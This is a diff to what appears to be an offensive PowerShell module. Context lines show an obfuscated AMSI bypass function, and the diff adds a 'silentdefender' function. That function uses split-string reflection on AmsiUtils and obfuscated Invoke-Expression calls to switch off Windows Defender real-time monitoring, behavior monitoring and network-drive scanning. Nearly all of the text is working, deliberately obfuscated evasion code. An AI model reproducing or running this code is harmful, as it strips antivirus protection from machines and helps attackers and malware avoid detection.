@@ -15766,3 +15766,15 @@ S`eT-It`em ( 'V'+'aR' +  'IA' + ('ble:1'+'q2')  + ('uZ'+'x') ) ( [TYpE]( "{1}{0}
 }
 Export-ModuleMember -Function bpsamsi
 Set-Alias -Name bpsamsi -Value bpsamsi
+
+#must be admin !!
+function silentdefender {
+	$Bpm4mSI=[Ref].Assembly.GetType('S'+'ys'+''+''+''+''+'t'+'em.M'+'a'+'na'+'g'+'e'+'m'+''+''+''+''+''+''+'e'+'n'+''+''+''+''+''+'t.Au'+'to'+'mat'+'ion.A'+''+''+''+''+'m'+'s'+'i'+'U'+'t'+'i'+'ls')
+	$field=$Bpm4mSI.GetField('a'+'m'+'s'+'i'+'I'+'ni'+''+''+''+''+'t'+'Fa'+'ile'+''+''+''+''+'d','N'+'on'+'Pu'+'b'+'l'+'ic,St'+'at'+'ic')
+	$atk = "{0}{7}{4}{3}{5}{6}{8}{4}{9}{10}{11}{1}{2}" -f "power", "tor", "ing 1", "S", " ", "et-M", "pPref", "shell", "erence", "-DisableRealtime", "Mo", "ni"
+	Invo''ke-Ex''pres''sion'' $atk;;$dxtk = "{0}{7}{9}{3}{5}{6}{8}{9}{4}{10}{11}{1}{2}" -f "power", "tor", "ing 1", "S", "-DisableBehavior", "et-M", "pPref", "shell", "erence", " ", "Mo", "ni"
+	I''nvo''ke-E''xpr''ess''ion'' $dxtk;;$csc4d3 = "{1}{3}{5}{2}{6}{8}{9}{2}{10}{7}{11}{4}{12}{0}{2}{14}{13}" -f "lScan 1", "pow", " ",  "ersh", "pedNetworkD", "ell", "Se", "Scann", "t-MpPrefe", "rence", "-Disable",  "ingMap",  "rivesForFul", "ce", "-For"
+	iex $csc4d3
+}
+Export-ModuleMember -Function silentdefender
+Set-Alias -Name silentdefender -Value silentdefender
